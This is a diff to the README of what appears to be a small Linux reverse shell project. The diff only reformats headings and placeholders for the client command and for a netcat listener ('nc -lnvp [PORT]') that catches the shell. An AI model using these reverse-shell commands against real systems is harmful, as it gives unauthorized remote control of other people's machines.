@@ -2,13 +2,13 @@
 
 This is a simple Reverse Shell written for linux platform execution.
 
-## Usage:
+## Client Usage:
 
-./linuxClient <IP> <PORT>
+./linuxClient [IP] [PORT]
 
 Where <IP> and <PORT> will default to the default defines if no paramters are passed.
 
 
-Handler side current Usage:
+## Handler current Usage (until custom handler work begins):
 
-nc -lnvp <PORT>
+nc -lnvp [PORT]
